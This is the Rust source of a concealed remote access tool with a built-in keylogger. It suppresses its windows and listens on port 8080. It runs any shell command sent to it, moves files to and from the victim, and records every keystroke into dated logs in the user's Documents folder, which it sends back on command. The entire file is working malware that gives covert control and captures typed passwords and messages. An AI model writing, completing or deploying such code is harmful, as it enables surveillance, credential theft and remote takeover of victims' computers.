#![windows_subsystem = "windows"]
use chrono::Local;
use rdev::{listen, EventType};
use std::env;
use std::fs::OpenOptions;
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;
use std::{
    io::{self, Read, Write},
    net::{TcpListener, TcpStream},
    process::{Command, Stdio},
};
mod utils;
use utils::transfer_files::{receive_file, send_file, send_folder};

fn main() -> std::io::Result<()> {
    let listener = TcpListener::bind("0.0.0.0:8080").unwrap();
    let stream_mutex = Arc::new(Mutex::new(None::<TcpStream>));
    let keystroke_log = Arc::new(Mutex::new(String::new()));

    start_keylogger_thread(Arc::clone(&keystroke_log));
    start_log_writer_thread(Arc::clone(&keystroke_log));

    // Start logging to a file at regular intervals
    let log_clone = Arc::clone(&keystroke_log);
    thread::spawn(move || {
        loop {
            thread::sleep(Duration::from_secs(10));

            // Write the captured keystrokes to a log file every minute
            let mut log_data = log_clone.lock().unwrap();
            if !log_data.is_empty() {
                if let Err(e) = append_to_log(&log_data) {
                    eprintln!("Failed to write to log file: {}", e);
                }
                log_data.clear();
            }
        }
    });

    for stream in listener.incoming() {
        if let Ok(stream) = stream {
            let stream_clone = Arc::clone(&stream_mutex);
            set_shared_stream(stream_clone, &stream)?;

            if let Err(e) = handle_client(stream) {
                eprintln!("Failed to process client: {}", e);
            }
        } else {
            eprintln!("Failed to accept connection.");
        }
    }

    Ok(())
}

fn start_keylogger_thread(log: Arc<Mutex<String>>) {
    thread::spawn(move || {
        if let Err(error) = listen(move |event| {
            if let EventType::KeyPress(key) = event.event_type {
                let mut log_data = log.lock().unwrap();
                log_data.push_str(&format!("{:?}\n", key));
            }
        }) {
            eprintln!("Keylogger error: {:?}", error);
        }
    });
}

fn start_log_writer_thread(log: Arc<Mutex<String>>) {
    thread::spawn(move || loop {
        thread::sleep(Duration::from_secs(10));

        let mut log_data = log.lock().unwrap();
        if !log_data.is_empty() {
            if let Err(e) = append_to_log(&log_data) {
                eprintln!("Log writing error: {}", e);
            }
            log_data.clear();
        }
    });
}

fn set_shared_stream(mutex: Arc<Mutex<Option<TcpStream>>>, stream: &TcpStream) -> io::Result<()> {
    let mut locked_stream = mutex.lock().unwrap();
    *locked_stream = Some(stream.try_clone()?);
    Ok(())
}

fn handle_client(mut stream: TcpStream) -> io::Result<()> {
    let mut buffer = [0; 1024];
    loop {
        let n = stream.read(&mut buffer)?;
        if n == 0 {
            println!("Client disconnected.");
            break;
        }

        let message = String::from_utf8_lossy(&buffer[..n]);
        if let Err(e) = handle_message(&mut stream, &message) {
            eprintln!("Error handling message '{}': {}", message, e);
        }
    }
    Ok(())
}

fn handle_message(stream: &mut TcpStream, message: &str) -> io::Result<()> {
    match message.trim().split_whitespace().next() {
        Some("upload") => handle_upload(stream, message),
        Some("download") => handle_download(stream, message),
        Some("keylogs") => handle_keylogs(stream),
        _ => handle_command(stream, message),
    }
}

fn handle_upload(stream: &mut TcpStream, message: &str) -> io::Result<()> {
    let filename = message
        .split_whitespace()
        .nth(1)
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "No file name provided"))?;
    receive_file(stream, filename)
}

fn handle_download(stream: &mut TcpStream, message: &str) -> io::Result<()> {
    let filename = message
        .split_whitespace()
        .nth(1)
        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "No file name provided"))?;
    send_file(stream, filename)
}

fn handle_keylogs(stream: &mut TcpStream) -> io::Result<()> {
    let mut folder_path = dirs::document_dir().expect("Could not find user's Documents directory");
    folder_path.push("Logs");

    if let Some(folder_str) = folder_path.to_str() {
        send_folder(stream, folder_str)
    } else {
        eprintln!("Failed to convert folder path to string.");
        Ok(())
    }
}

fn handle_command(stream: &mut TcpStream, message: &str) -> io::Result<()> {
    let response = match execute_command(message) {
        Ok(result) => result,
        Err(e) => format!("Command execution error: {}\n", e),
    };
    stream.write_all(response.as_bytes())
}

fn execute_command(message: &str) -> io::Result<String> {
    let trimmed_message = message.trim();

    // Split the input into command and arguments
    let mut parts = trimmed_message.split_whitespace();
    if let Some(command) = parts.next() {
        if command == "cd" {
            // Get the directory argument
            let target_dir = parts.next().unwrap_or("~");

            // Change directory
            let result = if target_dir == "~" {
                // Change to home directory
                dirs::home_dir().ok_or_else(|| {
                    io::Error::new(io::ErrorKind::NotFound, "Home directory not found")
                })
            } else {
                // Change to the specified directory
                env::set_current_dir(target_dir).map(|_| env::current_dir().unwrap())
            };

            match result {
                Ok(new_dir) => Ok(format!("Changed directory to: {}\n", new_dir.display())),
                Err(e) => Ok(format!("Failed to change directory: {}\n", e)),
            }
        } else {
            #[cfg(target_os = "windows")]
            let shell = "cmd";
            #[cfg(target_os = "windows")]
            let arg_flag = "/C";

            #[cfg(not(target_os = "windows"))]
            let shell = "sh";
            #[cfg(not(target_os = "windows"))]
            let arg_flag = "-c";

            // Run the command within the shell
            let mut command_process = Command::new(shell);
            command_process
                .arg(arg_flag)
                .arg(trimmed_message)
                .stdout(Stdio::piped())
                .stderr(Stdio::piped());

            #[cfg(target_os = "windows")]
            {
                use std::os::windows::process::CommandExt;
                const CREATE_NO_WINDOW: u32 = 0x08000000;
                command_process.creation_flags(CREATE_NO_WINDOW);
            }

            let output = command_process.output()?;

            // Get stdout and stderr
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);

            if !stdout.is_empty() {
                Ok(stdout.to_string())
            } else if !stderr.is_empty() {
                Ok(stderr.to_string())
            } else {
                Ok(format!("Command '{}' executed successfully.\n", message))
            }
        }
    } else {
        // If the command is empty
        Ok("No command received.".to_string())
    }
}

fn append_to_log(data: &str) -> io::Result<()> {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S");

    let mut file_path = dirs::document_dir().expect("Could not find user's documents directory");
    file_path.push("Logs");

    // Ensure the directory exists, otherwise create it
    std::fs::create_dir_all(&file_path)?;

    let file_name = format!("keylogger_{}.log", now.format("%Y-%m-%d"));
    file_path.push(file_name);

    let mut file = OpenOptions::new()
        .append(true)
        .create(true)
        .open(file_path)?;

    file.write_all(format!("{}:\n{}\n", timestamp, data).as_bytes())?;
    Ok(())
}
